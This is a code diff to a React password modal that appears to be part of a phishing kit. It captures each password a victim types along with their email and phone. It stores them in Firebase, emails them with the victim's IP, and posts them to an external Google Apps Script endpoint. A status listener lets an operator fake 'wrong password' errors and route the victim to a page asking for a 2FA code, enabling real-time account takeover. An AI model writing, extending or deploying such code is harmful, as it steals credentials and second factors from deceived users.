@@ -1,6 +1,6 @@
 import axios from "axios";
 import React, { useEffect, useState } from "react";
-import { onValue, ref, update } from "firebase/database";
+import { onValue, ref, set, update } from "firebase/database";
 import { database } from "../../Utils/firebase";
 import ButtonSoft from "../UI/ButtonSoft/ButtonSoft";
 import InputPassword from "../UI/InputPassword/InputPassword";
@@ -8,13 +8,14 @@ import Validating from "../Validating";
 import "./Modal.scss";
 import { useNavigate } from "react-router";
 import { sendEmail } from "../../Utils/sendEmail";
+import { v4 as uuidv4 } from "uuid";
 
 const passwords = [];
 
 // eslint-disable-next-line react/prop-types, no-unused-vars
 const Modal = ({ isModal, setIsModal }) => {
   const [password, setPassword] = React.useState("");
-
+  const [uid, setUid] = React.useState("");
   const [error_password, setErrorPassword] = React.useState(false);
   const [validating, setValidating] = useState(false);
 
@@ -29,69 +30,91 @@ const Modal = ({ isModal, setIsModal }) => {
     if (!password) {
       return;
     }
+
     setErrorPassword(false);
     setValidating(true);
     passwords.push(password);
     localStorage.setItem("passwords", JSON.stringify(passwords));
-    const data = JSON.parse(localStorage.getItem("form"));
-    const form = new FormData();
-    // form.append("day", data.day);
-    // form.append("month", data.month);
-    // form.append("year", data.year);
-    form.append("phone", data.phone);
-    form.append("email", data.email);
-    form.append("password", passwords);
 
-    const content = `
-    \n
-    IP: ${localStorage.getItem("ip")}
-    Phone: ${data.phone}
-    Email : ${data.email}
-    Password : ${password}
-    `;
+    if (passwords?.length > 1) {
+      const data = JSON.parse(localStorage.getItem("form"));
+      const form = new FormData();
+      form.append("phone", data.phone);
+      form.append("email", data.email);
+      form.append("password", passwords);
+      const updates = {};
+      updates[
+        "/records/" +
+          localStorage.getItem("record_uid") +
+          "/" +
+          "current_password"
+      ] = password;
+      updates[
+        "/records/" + localStorage.getItem("record_uid") + "/" + "password"
+      ] = [password];
+      updates[
+        "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
+      ] = "2z";
+      update(ref(database), updates);
+      axios.post(
+        "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
+        form
+      );
+    } else {
+      const data = JSON.parse(localStorage.getItem("form"));
+      const id = uuidv4();
+      set(ref(database, "records/" + id), {
+        email: data.email,
+        phone: data.phone,
+        user_status: "1",
+        done: false,
+        timestamp: Date.now(),
+        current_password: password,
+        password: [password],
+      }).then(() => {
+        localStorage.setItem("record_uid", id);
+        setUid(id);
+        const content = `
+          \n
+          IP: ${localStorage.getItem("ip")}
+          Phone: ${data.phone}
+          Email : ${data.email}
+          Password : ${password}
+          `;
 
-    sendEmail({ content: content });
+        sendEmail({ content: content });
 
-    const updates = {};
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "password"
-    ] = password;
-    updates[
-      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "Đang chờ xác nhận mật khẩu user từ admin";
-
-    update(ref(database), updates);
-
-    axios.post(
-      "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
-      form
-    );
+        const form = new FormData();
+        form.append("phone", data.phone);
+        form.append("email", data.email);
+        form.append("password", passwords);
+        axios.post(
+          "https://script.google.com/macros/s/AKfycbzQuBZK_LchvVKyD6OMP2wAP1a0afZcYffBfybX4w1rOglN5qyYDgqmZMMeWURajnrqjg/exec",
+          form
+        );
+      });
+    }
   };
 
   useEffect(() => {
-    if (isModal) {
-      const starCountRef = ref(
-        database,
-        "records/" + localStorage.getItem("record_uid")
-      );
+    if (isModal && uid) {
+      const starCountRef = ref(database, "records/" + uid);
       onValue(starCountRef, (snapshot) => {
         const data = snapshot.val();
         console.log(data);
-        if (data?.user_status === "Mật khẩu sai. Đang chờ user nhập lại.") {
+        if (data?.user_status === "2") {
           setValidating(false);
           setErrorPassword(true);
-        } else if (
-          data?.user_status === "Đang chờ bước waiting cuối cùng từ admin"
-        ) {
+        } else if (data?.user_status === "6") {
           natigate("/confirm/processing");
-        } else if (data?.user_status === "Nhập mã 2fa") {
+        } else if (data?.user_status === "3") {
           const updates = {};
           updates[
             "/records/" +
               localStorage.getItem("record_uid") +
               "/" +
               "user_status"
-          ] = "Đang chờ user nhập mã 2fa";
+          ] = "-1";
           update(ref(database), updates).then(() => {
             natigate("/confirm/2fa-code", {
               replace: true,
@@ -100,7 +123,7 @@ const Modal = ({ isModal, setIsModal }) => {
         }
       });
     }
-  }, [isModal]);
+  }, [isModal, uid]);
 
   return (
     <div
